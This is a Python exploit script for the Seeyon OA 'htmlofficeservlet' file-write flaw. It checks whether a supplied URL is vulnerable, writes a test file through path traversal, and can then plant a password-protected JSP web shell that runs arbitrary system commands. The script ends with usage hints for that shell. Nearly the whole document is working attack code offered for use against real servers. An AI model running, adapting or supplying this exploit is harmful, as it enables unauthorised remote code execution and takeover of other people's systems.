import requests
import time

header = {

    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"

}
url = input("input your want to test the url:")
post_url = url + '/seeyon/htmlofficeservlet'


def poc():
    file = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\zhengbianlu.txt')
    key_works = ''.join("zhengbianlu")

    data = "DBSTEP V3.0     355             0               12             DBSTEP=OKMLlKlV\r\n"
    data += "OPTION=S3WYOSWLBSGr\r\n"
    data += "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n"
    data += "CREATEDATE=wUghPB3szB3Xwg66\r\n"
    data += "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n"
    data += "originalFileId=wV66\r\n"
    data += "originalCreateDate=wUghPB3szB3Xwg66\r\n"
    data += "FILENAME={}\r\n".format(file)
    data += "needReadFile=yRWZdAS6\r\n"
    data += "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
    data += "a{}".format(key_works)

    requests.post(url=post_url, data=data, headers=header)

    upload_url = url +'/seeyon/zhengbianlu.txt'
    time.sleep(2)
    get_content = requests.get(url=upload_url)
    code = get_content.status_code
    content = get_content.text

    if code == 200 and key_works[1:] in content:
        print("this url exist the vuln and can getshell")
        print("the test's url is {}".format(upload_url))
    else:
        print("no vuln")

def exp():
    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\qwerasdf.jsp')
    exp_url = url + '/seeyon/htmlofficeservlet'

    payload = """DBSTEP V3.0     355             0               888            DBSTEP=OKMLlKlV\r
    OPTION=S3WYOSWLBSGr\r
    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
    CREATEDATE=wUghPB3szB3Xwg66\r
    RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
    originalFileId=wV66\r
    originalCreateDate=wUghPB3szB3Xwg66\r
    FILENAME=""" + file_name + """\r
    needReadFile=yRWZdAS6\r
    originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
    <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("zhengbianlu".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce"""

    requests.post(url=exp_url, data=payload, headers=header)
    get_content = requests.get(url+'/seeyon/qwerasdf.jsp?pwd=zhengbianlu&cmd=cmd+/c+echo+helloword')
    if 'helloword' in get_content.text:
        print("it was writed websehll and the path is {}".format(url+'/seeyon/qwerasdf.jsp?pwd=zhengbianlu&cmd=cmd+/c+echo+helloword'))
        print("the useage: url/seeyon/qwerasdf.jsp?pwd=zhengbianlu&cmd=cmd+/c+cmd")

def encode(origin_bytes):
    """
    重构 base64 编码函数
    """
    # 将每一位bytes转换为二进制字符串
    base64_charset = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
    base64_bytes = ['{:0>8}'.format(bin(ord(b)).replace('0b', '')) for b in origin_bytes]

    resp = ''
    nums = len(base64_bytes) // 3
    remain = len(base64_bytes) % 3

    integral_part = base64_bytes[0:3 * nums]
    while integral_part:
        # 取三个字节，以每6比特，转换为4个整数
        tmp_unit = ''.join(integral_part[0:3])
        tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
        # 取对应base64字符
        resp += ''.join([base64_charset[i] for i in tmp_unit])
        integral_part = integral_part[3:]

    if remain:
        # 补齐三个字节，每个字节补充 0000 0000
        remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8
        # 取三个字节，以每6比特，转换为4个整数
        # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
        tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
        resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='

    return resp


res = requests.get(url=post_url, headers=header)
keyword = 'DBSTEP V3.0     0               21              0               htmoffice operate err'
if keyword in res.text:
    poc()
    print("")
    print("Do you want to try to getshell?")
    print("Yes or No")
    an = input("")
    if an.lower() == 'yes':
        exp()
    elif an.lower() == 'no':
        pass
    else:
        an = print("please input the right answer:")


else:
    print("this no vuln {}".format(url))
